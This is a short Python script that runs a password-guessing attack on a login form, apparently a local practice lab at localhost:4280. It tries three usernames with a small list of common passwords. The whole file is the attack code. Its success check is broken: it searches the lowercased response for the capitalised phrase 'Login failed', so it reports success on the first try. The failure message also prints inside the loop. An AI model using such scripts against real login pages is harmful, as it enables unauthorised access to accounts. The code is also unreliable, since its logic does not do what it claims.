import requests

def bruteforce_login():

    url = "http://localhost:4280/brute"
    usernames = ["admin", "user", "test"]
    password_list = ["password", "123456", "admin", "letmein", "qwerty"]

    session = requests.Session()
    for username in usernames:
        for password in password_list:
            payload = {
                "username": username,
                "password": password,
                "Login": "Login"
            }
        
            response = session.post(url, data=payload)
        
            if "Login failed" not in response.text.lower():
                print(f"Success! Username: {username}, Password: {password}")
                return True
            else:
                print(f"Failed with password: {password}")
    
        print("Brute force attack failed.")
    return False

if __name__ == "__main__":
    bruteforce_login()